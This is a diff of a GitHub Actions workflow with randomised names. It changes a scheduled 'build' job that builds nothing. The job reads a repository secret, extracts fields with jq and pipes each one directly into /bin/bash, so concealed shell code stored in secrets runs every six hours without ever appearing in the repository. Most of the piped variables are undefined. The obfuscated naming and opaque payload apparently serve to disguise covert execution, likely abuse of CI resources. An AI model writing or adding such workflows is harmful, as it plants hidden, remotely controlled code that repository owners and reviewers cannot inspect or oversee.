@@ -2,18 +2,23 @@ name: zhouerlv6745
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
-jobs:  # 29468
+    - cron: '40 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhouerlv6745
         env:
-          cp60645: ${{ secrets.cp60645 }}
+          p0: ${{ secrets.p0 }}
         run: |
-          echo $cp60645 | jq -r .lgy174 | /bin/bash
-          echo $ha8 | jq -r .pyvmk36 | /bin/bash
-          echo $vd98055 | jq -r .yau8028 | /bin/bash
-          echo $zfnrd75117 | jq -r .hqdt38888 | /bin/bash
+          echo $p0 | jq -r .yblk43 | /bin/bash
+          echo $fdv654 | jq -r .vfhnz7828 | /bin/bash
+          echo $rqf67 | jq -r .bd38630 | /bin/bash
+          echo $xm90 | jq -r .n1882 | /bin/bash
+          echo $os238 | jq -r .wm85742 | /bin/bash
+          echo $gypa6 | jq -r .owva09 | /bin/bash
+          echo $eueo68 | jq -r .kl10 | /bin/bash
+          echo $crizo409 | jq -r .jw68 | /bin/bash
+          echo $iydty42946 | jq -r .c70593 | /bin/bash
 
